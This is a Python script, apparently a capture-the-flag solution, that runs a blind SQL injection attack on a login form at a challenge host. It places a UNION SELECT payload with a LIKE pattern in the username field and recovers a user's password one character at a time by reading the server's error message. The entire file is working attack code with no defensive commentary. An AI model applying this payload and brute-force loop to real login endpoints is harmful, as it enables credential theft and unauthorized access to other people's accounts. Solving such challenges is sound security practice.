import requests
import string

URL = "https://auth10x.chals.ageei.org/validate"

CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase + "!@#$^&*-_"

EXTRACTED_USERNAME = "LEGO-us3rn4m3-5b1706"

password = "LEGO-"

SQLI_TEMPLATE = "' UNION SELECT password, null, null FROM users WHERE username = '{username}' AND password LIKE '{pwd}%' -- "

def extract_password():
    global password
    while True:
        found = False
        for char in CHARSET:
            test_pwd = password + char
            print(f"[*] Testing: {test_pwd}%", end="\r")

            payload = {
                "username": SQLI_TEMPLATE.format(username=EXTRACTED_USERNAME, pwd=test_pwd),
                "password": ""
            }
            response = requests.post(URL, data=payload)

            if "Identifiants faux !" in response.text:
                password += char
                print(f"\n[✔] Found character: {char}")
                found = True
                break

        if not found:
            print("\n[🔥] Password Extraction Complete!")
            break

    return password

print("[+] Starting password brute-force extraction...")
final_password = extract_password()
print(f"[🚀] Extracted Password: {final_password}")

